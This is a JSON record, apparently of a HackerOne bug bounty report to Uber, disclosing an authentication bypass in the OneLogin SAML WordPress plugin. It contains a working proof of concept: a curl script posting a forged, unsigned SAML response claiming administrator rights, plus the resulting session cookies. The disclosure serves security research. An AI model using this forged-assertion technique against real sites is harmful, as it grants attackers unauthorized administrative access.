class=\"na\">ID=</span><span class=\"s\">&quot;pfxb75932c2-2e44-d18d-224b-354849a292af&quot;</span> <span class=\"na\">IssueInstant=</span><span class=\"s\">&quot;2016-05-04T01:37:34Z&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;saml:Subject&gt;</span>\n<span class=\"nt\">&lt;saml:NameID</span> <span class=\"na\">Format=</span><span class=\"s\">&quot;urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress&quot;</span><span class=\"nt\">&gt;</span>jouko@iki.fi<span class=\"nt\">&lt;/saml:NameID&gt;</span>\n<span class=\"nt\">&lt;saml:SubjectConfirmation</span> <span class=\"na\">Method=</span><span class=\"s\">&quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;saml:SubjectConfirmationData</span> <span class=\"na\">NotOnOrAfter=</span><span class=\"s\">&quot;2016-05-04T01:40:34Z&quot;</span> <span class=\"na\">Recipient=</span><span class=\"s\">&quot;&quot;</span> <span class=\"na\">InResponseTo=</span><span class=\"s\">&quot;ONELOGIN_bd24d63eafe235201b1bc636823c84381dbe575c&quot;</span><span class=\"nt\">/&gt;</span>\n<span class=\"nt\">&lt;/saml:SubjectConfirmation&gt;</span>\n<span class=\"nt\">&lt;/saml:Subject&gt;</span>\n<span class=\"nt\">&lt;saml:Conditions</span> <span class=\"na\">NotBefore=</span><span class=\"s\">&quot;2016-05-04T01:34:34Z&quot;</span> <span class=\"na\">NotOnOrAfter=</span><span class=\"s\">&quot;2016-05-04T01:40:34Z&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;saml:AudienceRestriction&gt;</span>\n<span class=\"nt\">&lt;saml:Audience&gt;</span>php-saml<span class=\"nt\">&lt;/saml:Audience&gt;</span>\n<span class=\"nt\">&lt;/saml:AudienceRestriction&gt;</span>\n<span class=\"nt\">&lt;/saml:Conditions&gt;</span>\n<span class=\"nt\">&lt;saml:AuthnStatement</span> <span class=\"na\">AuthnInstant=</span><span class=\"s\">&quot;2016-05-04T01:37:33Z&quot;</span> <span class=\"na\">SessionNotOnOrAfter=</span><span class=\"s\">&quot;2016-05-05T01:37:34Z&quot;</span> <span class=\"na\">SessionIndex=</span><span class=\"s\">&quot;_b340ffa0-f3c6-0133-3483-02a5406d9a2f&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;saml:AuthnContext&gt;</span>\n<span class=\"nt\">&lt;saml:AuthnContextClassRef&gt;</span>\nurn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport\n<span class=\"nt\">&lt;/saml:AuthnContextClassRef&gt;</span>\n<span class=\"nt\">&lt;/saml:AuthnContext&gt;</span>\n<span class=\"nt\">&lt;/saml:AuthnStatement&gt;</span>\n<span class=\"nt\">&lt;saml:AttributeStatement&gt;</span>\n<span class=\"nt\">&lt;saml:Attribute</span> <span class=\"na\">NameFormat=</span><span class=\"s\">&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;</span> <span class=\"na\">Name=</span><span class=\"s\">&quot;User.Username&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;saml:AttributeValue</span> <span class=\"na\">xmlns:xsi=</span><span class=\"s\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class=\"na\">xsi:type=</span><span class=\"s\">&quot;xs:string&quot;</span><span class=\"nt\">&gt;</span>admin<span class=\"nt\">&lt;/saml:AttributeValue&gt;</span>\n<span class=\"nt\">&lt;/saml:Attribute&gt;</span>\n<span class=\"nt\">&lt;saml:Attribute</span> <span class=\"na\">NameFormat=</span><span class=\"s\">&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;</span> <span class=\"na\">Name=</span><span class=\"s\">&quot;User.LastName&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;saml:AttributeValue</span> <span class=\"na\">xmlns:xsi=</span><span class=\"s\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class=\"na\">xsi:type=</span><span class=\"s\">&quot;xs:string&quot;</span><span class=\"nt\">&gt;</span>Pynnonen<span class=\"nt\">&lt;/saml:AttributeValue&gt;</span>\n<span class=\"nt\">&lt;/saml:Attribute&gt;</span>\n<span class=\"nt\">&lt;saml:Attribute</span> <span class=\"na\">NameFormat=</span><span class=\"s\">&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;</span> <span class=\"na\">Name=</span><span class=\"s\">&quot;User.FirstName&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;saml:AttributeValue</span> <span class=\"na\">xmlns:xsi=</span><span class=\"s\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class=\"na\">xsi:type=</span><span class=\"s\">&quot;xs:string&quot;</span><span class=\"nt\">&gt;</span>Jouko<span class=\"nt\">&lt;/saml:AttributeValue&gt;</span>\n<span class=\"nt\">&lt;/saml:Attribute&gt;</span>\n<span class=\"nt\">&lt;saml:Attribute</span> <span class=\"na\">NameFormat=</span><span class=\"s\">&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;</span> <span class=\"na\">Name=</span><span class=\"s\">&quot;User.email&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;saml:AttributeValue</span> <span class=\"na\">xmlns:xsi=</span><span class=\"s\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class=\"na\">xsi:type=</span><span class=\"s\">&quot;xs:string&quot;</span><span class=\"nt\">&gt;</span>noreply@uber.com<span class=\"nt\">&lt;/saml:AttributeValue&gt;</span>\n<span class=\"nt\">&lt;/saml:Attribute&gt;</span>\n<span class=\"nt\">&lt;saml:Attribute</span> <span class=\"na\">NameFormat=</span><span class=\"s\">&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;</span> <span class=\"na\">Name=</span><span class=\"s\">&quot;memberOf&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;saml:AttributeValue</span> <span class=\"na\">xmlns:xsi=</span><span class=\"s\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class=\"na\">xsi:type=</span><span class=\"s\">&quot;xs:string&quot;</span><span class=\"nt\">&gt;</span>Administrator<span class=\"nt\">&lt;/saml:AttributeValue&gt;</span>\n<span class=\"nt\">&lt;/saml:Attribute&gt;</span>\n<span class=\"nt\">&lt;/saml:AttributeStatement&gt;</span>\n<span class=\"nt\">&lt;/saml:Assertion&gt;</span>\n<span class=\"nt\">&lt;/samlp:Response&gt;</span>\n\n</code></pre>\n<p>Running the script sends an HTTP request containing a faked SAML response to WordPress. The plugin accepts it, sets authentication cookies and redirects the user to the front page.</p>\n\n<p>Sample WP response:</p>\n<pre class=\"highlight plaintext\"><code>HTTP/1.1 302 Found\nServer: nginx\nDate: Wed, 04 May 2016 06:24:22 GMT\nContent-Type: text/html\nContent-Length: 20\nConnection: keep-alive\nKeep-Alive: timeout=20\nSet-Cookie: wordpress_sec_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ceb93b7768e2ebb6625b58e4bc7c2c4e63cce7651846e1b834d649258f2b9a9cd; path=/wp-content/plugins; secure; httponly\nSet-Cookie: wordpress_sec_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ceb93b7768e2ebb6625b58e4bc7c2c4e63cce7651846e1b834d649258f2b9a9cd; path=/; secure; httponly\nSet-Cookie: wordpress_logged_in_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ce566c71dac745da6f17cd52c7c3c2d3f0cc6baec81b4d79d97fb153896e0acee; path=/; secure; httponly\nSet-Cookie: saml_login=1; expires=Thu, 04-May-2017 06:24:22 GMT; path=/\nSet-Cookie: wordpress_user_sw_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/\nSet-Cookie: wordpress_user_sw_secure_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/\nSet-Cookie: wordpress_user_sw_olduser_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/\nLocation: https://newsroom.uber.com\n</code></pre>\n<p>After this you can e.g. copy the cookies to a web browser to use the website as a logged-in user.</p>\n\n<h1 id=\"details\">Details</h1>\n\n<p>The WordPress plugin fails to adequately validate the SAML response. The bug is in the file <em>wp-content/plugins/onelogin-saml-sso/php/lib/Saml2/Response.php</em>, function <em>isValid()</em>. The cryptographical signature check is inside a code block that is executed only if the XML response contains a &lt;ds:Signature /&gt; tag.</p>\n<pre class=\"highlight php\"><code>   if (!empty($signedElements)) {\n       // verify signature\n   }\n</code></pre>\n<p>If the tag is left out, then the plugin accepts any &quot;authentication OK&quot; response without checking if it&#39;s coming from a trusted source.</p>\n\n<p>The above XML may have some unnecessary data. I just took a valid OneLogin response and removed the &lt;ds:Signature /&gt; tag, plus some others.</p>\n", 
    "vulnerability_information": "First, I'm sorry about reporting another WordPress bug (my intention was just to check if WP-OneLogin stores any sensitive info that could be used to attack OneLogin on your other websites).\n\n#Overview#\nThe *.uber.com WordPress sites use OneLogin SAML-SSO instead of the normal WordPress login. The WordPress plugin shipped by OneLogin has a bug which allows anyone to login without a password or other authentication.\n\nThe attacker can supply a username, email adress, name, and a role. If the username doesn't already exist in the WordPress database, then the plugin will create a new user (if the provisioning setting is on, which it was on the two sites I tested).\n\nIt looks like in order to gain administrator privileges the attacker has to guess some information - a role name such as \"administrator\", or the email address or username of an existing administrator.\n\n#PoC#\nI tried this on two sites. On eng.uber.com I couldn't guess a correct role name, user name, or email address to get administrator privileges and therefore was able to create only a \"subscriber\" level account. On newsroom.uber.com the role name apparently was simply \"administrator\" so I got that privilege on the system. Some other plugin settings may affect this behavior too.\n\n#Reproducing#\nAn example shell script:\n~~~~ sh\n#!/bin/sh\nxml=`base64 response.xml`\ncurl -v 'https://newsroom.uber.com/wp-content/plugins/onelogin-saml-sso/onelogin_saml.php?acs' \\\n    --data \"RelayState=/wp-login.php\" --data-urlencode \"SAMLResponse=$xml\"\n~~~~\nThe required file \"response.xml\" containing a SAML response:\n~~~~ xml\n<samlp:Response xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" ID=\"R0bdb6f33ef84425aa2782eab4483792762f297df\" Version=\"2.0\" IssueInstant=\"2016-05-04T01:37:34Z\" Destination=\"\" InResponseTo=\"ONELOGIN_bd24d63eafe235201b1bc636823c84381dbe575c\">\n<samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status>\n<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" Version=\"2.0\" ID=\"pfxb75932c2-2e44-d18d-224b-354849a292af\" IssueInstant=\"2016-05-04T01:37:34Z\">\n<saml:Subject>\n<saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\">jouko@iki.fi</saml:NameID>\n<saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\">\n<saml:SubjectConfirmationData NotOnOrAfter=\"2016-05-04T01:40:34Z\" Recipient=\"\" InResponseTo=\"ONELOGIN_bd24d63eafe235201b1bc636823c84381dbe575c\"/>\n</saml:SubjectConfirmation>\n</saml:Subject>\n<saml:Conditions NotBefore=\"2016-05-04T01:34:34Z\" NotOnOrAfter=\"2016-05-04T01:40:34Z\">\n<saml:AudienceRestriction>\n<saml:Audience>php-saml</saml:Audience>\n</saml:AudienceRestriction>\n</saml:Conditions>\n<saml:AuthnStatement AuthnInstant=\"2016-05-04T01:37:33Z\" SessionNotOnOrAfter=\"2016-05-05T01:37:34Z\" SessionIndex=\"_b340ffa0-f3c6-0133-3483-02a5406d9a2f\">\n<saml:AuthnContext>\n<saml:AuthnContextClassRef>\nurn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport\n</saml:AuthnContextClassRef>\n</saml:AuthnContext>\n</saml:AuthnStatement>\n<saml:AttributeStatement>\n<saml:Attribute NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\" Name=\"User.Username\">\n<saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">admin</saml:AttributeValue>\n</saml:Attribute>\n<saml:Attribute NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\" Name=\"User.LastName\">\n<saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">Pynnonen</saml:AttributeValue>\n</saml:Attribute>\n<saml:Attribute NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\" Name=\"User.FirstName\">\n<saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">Jouko</saml:AttributeValue>\n</saml:Attribute>\n<saml:Attribute NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\" Name=\"User.email\">\n<saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">noreply@uber.com</saml:AttributeValue>\n</saml:Attribute>\n<saml:Attribute NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\" Name=\"memberOf\">\n<saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">Administrator</saml:AttributeValue>\n</saml:Attribute>\n</saml:AttributeStatement>\n</saml:Assertion>\n</samlp:Response>\n\n~~~~\n\nRunning the script sends an HTTP request containing a faked SAML response to WordPress. The plugin accepts it, sets authentication cookies and redirects the user to the front page.\n\nSample WP response:\n~~~~\nHTTP/1.1 302 Found\nServer: nginx\nDate: Wed, 04 May 2016 06:24:22 GMT\nContent-Type: text/html\nContent-Length: 20\nConnection: keep-alive\nKeep-Alive: timeout=20\nSet-Cookie: wordpress_sec_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ceb93b7768e2ebb6625b58e4bc7c2c4e63cce7651846e1b834d649258f2b9a9cd; path=/wp-content/plugins; secure; httponly\nSet-Cookie: wordpress_sec_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ceb93b7768e2ebb6625b58e4bc7c2c4e63cce7651846e1b834d649258f2b9a9cd; path=/; secure; httponly\nSet-Cookie: wordpress_logged_in_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ce566c71dac745da6f17cd52c7c3c2d3f0cc6baec81b4d79d97fb153896e0acee; path=/; secure; httponly\nSet-Cookie: saml_login=1; expires=Thu, 04-May-2017 06:24:22 GMT; path=/\nSet-Cookie: wordpress_user_sw_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/\nSet-Cookie: wordpress_user_sw_secure_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/\nSet-Cookie: wordpress_user_sw_olduser_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/\nLocation: https://newsroom.uber.com\n~~~~\nAfter this you can e.g. copy the cookies to a web browser to use the website as a logged-in user.\n\n#Details#\nThe WordPress plugin fails to adequately validate the SAML response. The bug is in the file *wp-content/plugins/onelogin-saml-sso/php/lib/Saml2/Response.php*, function *isValid()*. The cryptographical signature check is inside a code block that is executed only if the XML response contains a <ds:Signature /> tag.\n~~~~ php\n   if (!empty($signedElements)) {\n       // verify signature\n   }\n~~~~\nIf the tag is left out, then the plugin accepts any \"authentication OK\" response without checking if it's coming from a trusted source.\n\nThe above XML may have some unnecessary data. I just took a valid OneLogin response and removed the <ds:Signature /> tag, plus some others.\n\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.uber.com", 
            "about": "", 
            "twitter_handle": "", 
            "name": "Uber"
        }, 
        "handle": "uber", 
        "url": "https://hackerone.com/uber", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/314/826c90cba1555458df787ae914793cd5070e18df_small.png?1514905146", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/314/0010251d7088db2a1b236eb594b6371af4492609_medium.png?1514905146"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 314, 
        "default_currency": "usd"
    }, 
    "is_published": false
}